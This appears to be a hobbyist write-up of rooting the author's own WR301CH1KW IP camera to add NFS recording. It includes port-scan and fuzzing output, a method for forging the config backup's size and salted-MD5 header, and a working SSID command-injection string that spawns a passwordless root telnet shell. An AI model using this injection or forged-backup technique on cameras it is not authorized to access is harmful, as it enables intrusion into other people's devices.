# WR301CH1KW 3MP Cheap Chinese IP Camera Penetration test and customization
##### Introduction
So recently I installed some 4K security cameras outside the house and loved the fact that I didn't need a specific NVR device or SD card to capture/store the recordings of the cameras as they have NFS support and can detect motion and record the video files directly to a NFS mount on the network (in my case a USB hard drive connected to a cheap router running ASUS merlin).
The outside cameras are for security but inside the house we have 2 cats which we like to keep an eye on when we travel for a few days, so I decided to look for a cheaper indoor camera with Pan-Tilt support for that purpose.
Needless to say I had to scour an ocean of cheap IP camera options and the only few brands seemed more likely to have NFS support (Hikvision and Dahua cameras). The problem is that a 1080P camera from those brands is more expensive than the 4K cameras I bought for outside, so there's no way I would go for that.
I ended up messaging a few vendors and posting a few questions on products from aliexpress and amazon and did not find anything that I was certain had NFS support (at a reasonable price), the closest thing I found was this CAD$30 (US$20) camera (shipping included) which had a clear description saying "Support Onvif (NVR , NAS storage support)". Now I suspected (and was right) that this would not have true 'NAS' support as it claims but thought it was worth a shot for the price.
##### Hardware
The hardware model is listed as WR301CH1KW (label and in the device) but I suspect this is just an OEM branding from the actual manufacturer which I am certain makes many other cameras in the market (click image for link or search aliexpress):
[![Camera](https://raw.githubusercontent.com/guino/WR301CH1KW/main/img/WR301CH1KW.png)](https://www.aliexpress.com/item/4001097806137.html)
I figured for the price I paid the worst that could happen was for me to just install a microSD card and use it with the provided features, but more importantly I knew in advance the device has a web-page interface which could be the gateway for some exploiting and customization:
![Web Interface](https://raw.githubusercontent.com/guino/WR301CH1KW/main/img/webif.png)
###### Penetration test
After I had the device for a few days working with the standard features I had some time and decided to investigate it. The first thing was to check if there was anything published on this type of camera online: turned out nothing, but I already know there are a number of other cameras in the market with the same 'hisilicon' boards in them.
Next, a quick check for open ports:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 18:15 EST
Nmap scan report for IPCAM (10.10.10.245)
Host is up (0.0030s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
8080/tcp open  http-proxy
```
No ssh/telnet port open so my only option without tearing the device appart (to find a serial port) is to check for anything I can use in the web server, so lets fuzz this thing:
```
$ wfuzz -w common.txt --hc=404 --basic user:pass http://10.10.10.245/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.245/FUZZ
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                      
=====================================================================

000000224:   301        0 L      0 W        0 Ch        "css"                                        
000000308:   301        0 L      0 W        0 Ch        "english"                                    
000000413:   301        0 L      0 W        0 Ch        "images"                                     
000000456:   301        0 L      0 W        0 Ch        "js"                                         
000000471:   301        0 L      0 W        0 Ch        "lib"                                        
000000483:   301        0 L      0 W        0 Ch        "log"                                        
000000692:   301        0 L      0 W        0 Ch        "resources"                                  
000000777:   301        0 L      0 W        0 Ch        "spanish"                                    

Total time: 0
Processed Requests: 951
Filtered Requests: 942
Requests/sec.: 0
```
Not a lot to to see there other than the basic web page stuff and the 'log' url which ended up not only having the syslog (with hardly anything relevant) but also included an entire 'tmp' directory for the device:
```
Index of /log/

Name	Modified	Size
Parent directory	 -	  -
lib/	 31-Dec-1969 19:00	  [DIRECTORY]
sd/	 12-Nov-2020 14:24	  [DIRECTORY]
fddns.dat	 10-Mar-2019 04:10	  5
ipc.ok	 12-Nov-2020 17:20	  0
m.ok	 10-Mar-2019 04:10	  0
netflag.dat	 10-Mar-2019 04:10	  2
proc.tmp	 12-Nov-2020 18:15	  3.2k
sd_flag	 12-Nov-2020 17:20	  0
sdt.ok	 12-Nov-2020 17:20	  0
sensor.conf	 31-Dec-1969 19:00	  9
syslog.txt	 12-Nov-2020 18:20	  316
th3ddns.dat	 10-Mar-2019 04:10	  5
upnpmap.dat	 10-Mar-2019 04:10	  5
wifi.mac	 31-Dec-1969 19:00	  18
wifi.type	 31-Dec-1969 19:00	  5
wpa.conf	 31-Dec-1969 19:00	  129
```
I already knew (from the web interface) that I could list/download the video files on the SD card using the 'sd' url, and had even been downloading and backing up the video files on my NAS that way but at the cost of wearing out my micro SD card. The idea was to do everything directly to the NAS so I kept looking and got to the 'backup and restore' settings feature on the settings page of the web interface.
I promptly saved a backup which gave me a 'config_backup.bin' file, opened it in an editor and is a binary file (expected), so without hesitation I googled the file name and came across a page also doing penetration test on a different IP camera model (which also saved a backup of same name): http://www.wolfteck.com/2019/03/07/getting_into_the_ctipc-275c1080p/
After some brief reading and comparison I was able to remove the 512 byte header from the config backup and extract the configuration files from the resulting tar.gz file:
```
$ ls
config_3thddns.ini  config_devices.ini  config_preset_bak.ini  config_sysinfo.ini   hostapd8192_5g.conf
config_acl.ini      config_encode.ini   config_preset.ini      config_timer.ini     ipcam_upnp.xml
config_action.ini   config_image.ini    config_ptz.ini         config_user.ini      resolv.conf
config_alarm.ini    config_lamp.ini     config_recsnap.ini     config_videoex.ini   TZ
config_com485.ini   config_md.ini       config_run3g.ini       config_wifiex.ini    wifi.conf
config_cover.ini    config_ntp.ini      config_schedule.ini    config_wifi.ini
config_custom.ini   config_onvif.ini    config_smartrack.ini   hostapd7601.conf
config_debug.ini    config_osd.ini      config_smd.ini         hostapd8192_2g.conf
```
Allright, I propmptly went over the files to see if there was anything that could be used to inject some custom command but immediately noticed this in config_debug.ini:
```
[telnet]
tenable			       = "0	       	   "
```
Well, that's a start, let's change that to 1 and see if I can upload it to the camera, right ? so I compressed the config files again (same structure as before), slapped the header back in place and (as expected) the web interface gave me a 'bad argument' error when I uploaded the new config file to it. 
Also tried some of the tricks from the site that was working with the config_backup.bin and still could not get my changed backup to work, so I started to examine the header section:
```
00000000   50 49 48 43  01 10 00 00  00 00 00 00  00 00 00 00  PIHC............
00000010   00 00 00 00  00 00 00 00  E4 16 00 00  49 50 43 41  ............IPCA
00000020   4D 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  M...............
00000030   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000040   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000050   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000060   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000070   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000080   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000090   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
000000A0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
000000B0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
000000D0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
000000E0   00 00 00 00  30 61 64 61  30 38 30 32  37 64 32 64  ....0ada08027d2d
000000F0   33 32 31 31  34 32 37 65  37 34 62 39  66 38 39 37  3211427e74b9f897
00000100   36 32 37 36  00 00 00 00  00 00 00 00  00 00 00 00  6276............
00000110   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
```
So that looks like a fixed header, 2 bytes for something, an ID (IPCAM) and MD5 hash (ther rest of the 512 bytes was all zeroed).
The 2 bytes "E4 16" (or "16 E4") could be a crc or size, so after a few checks 0x16E4 is the exact size of the config_backup.bin without the header (the size of payload/tar.gz file), good -- I should be able to set that.
Now for the MD5: could it just be the MD5 of the tar.gz portion as well ? nope. That took some digging and after I found the 'config_packer' mentioned on the other page (which wouldn't work on my camera) it seems the MD5 hash is obtained by adding the ID 'IPCAM' to the end of the payload/tar.gz portion of the file, which got me the exact MD5 in the original header, so now I can make my own config 'build' script (which is in the repo for reference).
With my config build script ready and previously tested without configuration changes, I then changed the 'tenable' setting to '1' and uploaded it to the camera, and this time nmap listed port 23 (telnet) open and I was able to telnet into the camera:
```
$ telnet 10.10.10.245
Trying 10.10.10.245...
Connected to 10.10.10.245.
Escape character is '^]'.

IPCamera login: 
```
Now the tedious task of trying to find a valid user and password to login... I too exhausted all options from previously posted ip cameras I could find online without success. I also did not have any 'script' in the backup that I could use inject a command to add/modify/bypass the password. 
Somewhat stuck I started searching for any references to any files and/or contents in the .ini and .conf files online which got me to a page where someone reverse engineered code from a similar ip camera in the past and did some extensive research on vulnerabilities (by tearing it down): https://sysdream.com/news/lab/2020-01-03-iot-pentest-of-a-connected-camera/
Most importantly what got me to that page was the possibility of the SSID code injection, and since I had a ready-to-use way of modifying that without checks for special characters (my config backup build script), I went ahead and modified the SSID in the wifi.conf file based on their findings, and after a few tries (to find telnetd and sh path) got me to this:
```
WifiSsid="SSID"|/usr/sbin/telnetd -l /bin/sh -p 24""
```
Which allowed me to telnet into the camera as root without a password:
```
$ telnet 10.10.10.245 24
Trying 10.10.10.245...
Connected to 10.10.10.245.
Escape character is '^]'.

~ # 
```
##### Customization
The objective with the process above was not to expose vulnerabilities or make it possible to 'hack' cameras, in fact the process above required me to have access to the web interface of the camera using a valid user/password combination (although that can be reset physically on the camera) -- the whole point is to be able to customize the device to my specific needs, specifically to store the video files on my NFS share directly instead of using a microSD card altogether.
With root access, the first thing to do is to secure any remote access to the camera so that it can't be hacked with known username/password combinations, so I went ahead and edited /etc/passwd and /etc/shadow to have username and passwords (hash) only known to me.
Unlike other cameras I have seen in the market this one actually uses a read-write JFFS mount in the device which allows us to just modify and copy files to the built-in memory without having to re-flash the device (nice), otherwise I would have just made a more intricate SSID code injection command to mount the NFS share and then copy/execute anything I need from it (or download a file from a share/url/etc).
Once I verified my new telnet user/pass worked I went ahead and removed the SSID code injection to start the passwordless telnetd (no longer needed).
Now to see if I can mount my NFS share from the camera, so I umounted the microSD card and tried:
```
$ mount -t nfs 10.10.10.2:/mnt/3TB/nvr-PTZ /mnt/mtb/ipc/tmpfs/sd
```
That did not work and instead locked up until it finally gave a timeout error. It seems there are some processes not running on a basic busybox that don't allow it work normally, but searching online I found these alternate options which worked just fine:
```
$ mount -o port=2049,nolock,proto=tcp -t nfs 10.10.10.2:/mnt/3TB/nvr-PTZ /mnt/mtb/ipc/tmpfs/sd
```
With the microSD card still in the camera (though unmounted) I was able to verify the camera could record new video files to the NFS share even over a lame 2.4ghz WIFI, but I noticed that after rebooting the camera without the microSD card and with the NFS share mounted the web interface would say the card is not installed and no new videos would be recorded.
So chances are that some script/process is checking for the SD card so that it can be reported to the web interface and/or to enable/disable recording to the 'sd' directory (otherwise it would fill up the RAM and the camera would run out of memory).
It took some fiddle but after reviewing the flags/files/devices and everything that happens when a microSD card is installed I created a script that would create the same flags and files under /sys/bus/mmc/devices so that the ipc_server process would think there's a valid SD card and write files to the NFS share (When a card is not inserted) -- the script is nfs.sh and it requires the nosd.tgz file under /mnt/mtd/ipc of the camera to work.
With the script completed/tested all that was left was to add a call to /mnt/mtd/ipc/run (a startup script on this camera) to call my nfs.sh script at the end of the startup process.
##### Side note
After it was all said and done, I noticed that the /mnt/mtd/ipc/run script had these lines right at the top:
```
TARGET="/mnt/mtd/ipc"
CONF="$TARGET/conf"
NETINFO=$CONF/config_net.ini
NETPRIV=$CONF/config_priv.ini
PLATFORM=$CONF/config_platform.ini
NETDEV=eth0
WIFIST=0
WIFIPATH="$CONF/wifi.conf"
. $WIFIPATH
```
That last line basically executes whatever is in the wifi.conf file (which is part of the backup). By default that file only sets a few variables but it should be possible to execute any commands as root by simply adding them to that file -- this is likely why the SSID code injection worked since it got executed as part of a command (similarly to the code injection found on another camera, though on different command and file).
##### Boot fix
Even before I made any changes to the camera, I had noticed how it many times it wouldn't boot up or reboot completely. It seems that during the start sequence it was trying to calibrate the pan-tilt motors and test the IR led switch and it seems like that was pulling too much power at once or perhaps there was some sort of I/O conflict between the kernel and processes trying to do a number of things at once.
I was getting tired of it freezing up 50% of the time during boot up/reboot so I modified the /mnt/mtd/ipc/run script so that it would call the 'loadmotor' process much earlier, then sleep for a few extra seconds (to give time for the motor calibration to finish) and only then start the other processes that start web server and check/set the IR sensor.
While the changes only added a few seconds to the boot process it seems the camera is a lot more stable now during boot up and reboots, and now that I know this cheap camera can work with NFS in a stable manner I might get 1 or 2 more of these cameras for other places around the house.
